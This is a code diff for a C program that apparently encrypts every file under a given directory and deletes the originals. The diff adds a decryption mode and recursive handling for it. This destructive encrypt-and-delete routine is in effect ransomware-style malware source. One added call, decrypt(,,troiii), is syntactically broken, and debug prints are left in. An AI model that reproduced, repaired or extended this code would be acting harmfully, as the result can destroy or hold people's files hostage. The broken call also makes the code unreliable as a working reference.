@@ -67,13 +67,22 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
 
 			{
-			char path[BUFSIZE] = {0};
-			strcat(path,name);
-			strcat(path,"/");
-			strcat(path,entity->d_name);
-			listdir(path, iv, key, 'e');
+				char path[BUFSIZE] = {0};
+				strcat(path,name);
+				strcat(path,"/");
+				strcat(path,entity->d_name);
+				if(de_flag=='e')
+				{
+					listdir(path, iv, key, 'e');
+				}
+				if(de_flag=='d')
+				{
+					listdir(path, iv, key, 'd');
+				}
+
+
 			}
-			if(entity->d_type == DT_REG && de_flag=='e')
+			if(de_flag=='e' && entity->d_type == DT_REG)
 			{
 				//printf("<<<<<%s>>>>\n",name);
 				 
@@ -85,6 +94,20 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 				strcat(twooo,entity->d_name);
 				printf("%s \n",twooo);
 				encrypt(key, iv,twooo);
+				printf("REPASSE ICI");
+				remove(twooo);
+				
+			}
+			else if(de_flag=='d' && entity->d_type == DT_REG)
+			{
+				char troiii[300] = "";
+				strcat(troiii,name);
+				strcat(troiii,"/");
+				strcat(troiii,entity->d_name);
+				decrypt(,,troiii);
+				remove(troiii);
+				
+				
 			}
 		}
 		
@@ -92,6 +115,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	}
 	closedir(dir);
 }
+
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
 {
@@ -170,8 +194,9 @@ int main (int argc, char * argv[])
 			listdir(argv[1], iv, key, 'e');
 		}
 		
-		else if (strcmp(argv[2], "-dec")==0)
+		if (strcmp(argv[2], "-dec")==0)
 		{
+			listdir(argv[1], iv, key, 'd');
 			printf("test");
 		}
 	}
